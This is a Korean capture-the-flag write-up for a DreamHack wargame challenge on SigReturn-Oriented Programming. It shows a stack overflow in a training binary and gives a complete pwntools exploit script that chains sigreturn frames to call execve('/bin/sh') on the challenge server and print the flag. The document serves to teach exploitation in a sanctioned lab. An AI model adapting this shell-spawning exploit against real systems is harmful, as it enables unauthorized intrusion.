# [DreamHack] SigReturn-Oriented Programming

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: SigReturn-Oriented Programming에서 실습하는 문제입니다.
>
> Release: [SigReturn-Oriented Programming.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8546857/SigReturn-Oriented.Programming.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161716906-9ab19cb8-2cba-464a-802a-aecfedae902c.png)

## Analysis

```c
int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024);
}
```

`main()`의 `read(0, buf ,1024)`에서 BOF가 발생한다. 입력 길이가 충분히 길기 때문에 ROP를 수행할 수 있다.

`gadget()`은 어셈블리로 보면 다음과 같다.

![image](https://user-images.githubusercontent.com/102066383/161717578-c3208926-1df9-45bd-8f65-25d3e8477cd6.png)

`pop rax; syscall; ret`로 원하는 시스템 콜을 호출할 수 있는 가젯이 있다.

## Exploit

`execve("/bin/sh", 0, 0)` 시스템 콜을 호출하면 셸을 획득할 수 있다.

먼저 `"/bin/sh"` 문자열을 이용할 수 있도록 BSS에 `"/bin/sh"`와 `execve("/bin/sh", 0, 0)`을 호출하는 ROP chain을 넣어두고, `sigreturn` 시스템 콜로 `rsp`를 BSS로 옮기면 된다.

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/srop')
else:
    r = remote('host1.dreamhack.games', 14984)

bss = 0x601040  # bss buffer
pop_rax_syscall = 0x4004eb  # pop rax; syscall; ret;
syscall = 0x4004ec  # syscall; ret;


payload = b'a' * 0x18  # dummy

# read(0, bss, 0x100)
frame = SigreturnFrame()
frame.rax = 0  # syscall number of read
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x100
frame.rsp = bss + 8  # move stack frame to bss
frame.rip = syscall
payload += p64(pop_rax_syscall)
payload += p64(0xf)
payload += bytes(frame)

r.send(payload)


# write "/bin/sh" + ropchain at bss
payload = b'/bin/sh\x00'
frame = SigreturnFrame()
frame.rax = 0x3b  # syscall number of execve
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss
frame.rip = syscall
payload += p64(pop_rax_syscall)
payload += p64(0xf)
payload += bytes(frame)

r.send(payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 14984: Done
[*] Switching to interactive mode
$ cat flag
DH{4a177764b353c1295afec0071a8e7951}
```